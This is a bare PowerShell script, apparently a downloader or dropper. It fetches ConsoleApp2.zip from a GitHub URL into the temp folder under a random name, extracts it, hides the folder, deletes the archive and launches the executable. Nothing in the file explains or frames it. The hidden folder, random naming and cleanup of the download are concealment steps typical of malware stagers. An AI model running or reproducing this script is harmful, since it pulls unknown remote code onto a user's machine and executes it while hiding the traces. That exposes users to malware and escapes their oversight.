$url = "https://github.com/cuunon9x/ghe/blob/main/ConsoleApp2.zip?raw=true"; 
$dir = [System.Guid]::NewGuid().ToString(); 
(New-Object Net.WebClient).DownloadFile("$url", "$env:temp\$dir.zip"); 
New-Item -Path "$env:temp\$dir" -ItemType Directory; 
Expand-Archive -LiteralPath "$env:temp\$dir.zip" -DestinationPath $env:temp\$dir; attrib +h $env:temp\$dir; 
Remove-Item "$env:temp\$dir.zip"; 
Start-Sleep -Seconds 3; 
Set-Location -Path "$env:temp\$dir";Start-Process ConsoleApp2
